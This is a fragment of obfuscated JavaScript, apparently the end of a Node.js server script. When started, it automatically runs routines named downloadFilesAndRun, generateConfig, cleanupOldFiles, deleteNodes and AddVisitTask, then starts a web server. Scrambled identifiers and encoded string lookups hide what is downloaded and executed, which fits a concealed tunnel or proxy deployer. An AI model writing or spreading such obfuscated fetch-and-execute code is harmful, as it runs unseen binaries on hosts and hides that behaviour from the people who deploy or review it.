console['log'](_0x27c671(0x24d)),_0x9ff52c;}catch(_0x5393e5){return console[_0x27c671(0x1b6)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x5393e5[_0x27c671(0x1d1)]),null;}}async function startserver(){const _0x19e8cc=_0x4747b9;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x204185){console[_0x19e8cc(0x1b6)](_0x19e8cc(0x1dc),_0x204185);}}startserver()[_0x4747b9(0x21c)](_0x1e84d6=>{const _0x3aed90=_0x4747b9;console[_0x3aed90(0x1b6)]('Unhandled\x20error\x20in\x20startserver:',_0x1e84d6);}),app[_0x4747b9(0x1f5)](PORT,()=>console[_0x4747b9(0x240)](_0x4747b9(0x1e4)+PORT+'!'));
